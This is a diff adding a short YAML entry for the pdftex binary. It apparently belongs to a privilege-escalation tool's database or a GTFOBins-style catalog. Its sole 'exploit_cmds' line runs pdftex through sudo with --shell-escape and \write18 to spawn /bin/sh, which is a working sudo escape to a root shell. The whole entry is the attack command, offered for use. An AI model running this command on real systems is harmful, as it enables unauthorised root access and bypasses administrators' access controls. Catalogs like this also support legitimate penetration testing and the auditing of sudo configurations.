@@ -1,0 +1,4 @@
+name: pdftex
+binary_path: /usr/bin/pdftex
+exploit_cmds:
+- sudo /usr/bin/pdftex --shell-escape '\write18{/bin/sh}\end'
